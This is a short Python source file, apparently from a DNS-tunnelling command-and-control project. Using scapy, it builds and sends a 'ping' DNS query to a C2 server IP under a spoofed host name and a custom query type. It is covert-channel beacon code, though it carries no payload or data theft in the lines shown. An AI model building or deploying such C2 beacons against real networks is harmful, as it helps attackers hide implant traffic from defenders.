# external imports
from scapy.all import Ether, IP, UDP, DNS, DNSQR, sendp

# internal imports
from utils.consts import INTERFACE, CC_SERVER_IP, CC_SERVER_SPOOFED_HOST, PACKET_OPTIONS
from utils.request_type import RequestType

class PingRequest:
    def __init__(self):
        pass
    
    def build(self):
        ether = Ether()
        ip = IP(dst=CC_SERVER_IP)
        udp = UDP(sport=PACKET_OPTIONS['UDP']['SPORT'], dport=PACKET_OPTIONS['UDP']['DPORT'])
        dns = DNS(
            qr=PACKET_OPTIONS['DNS']['QR'],
            qdcount=1,
            qd=DNSQR(qname=CC_SERVER_SPOOFED_HOST, qtype=RequestType.PING.value)
        )

        return ether/ip/udp/dns
    
    def send(self):
        sendp(x=self.build(), iface=INTERFACE, verbose=0)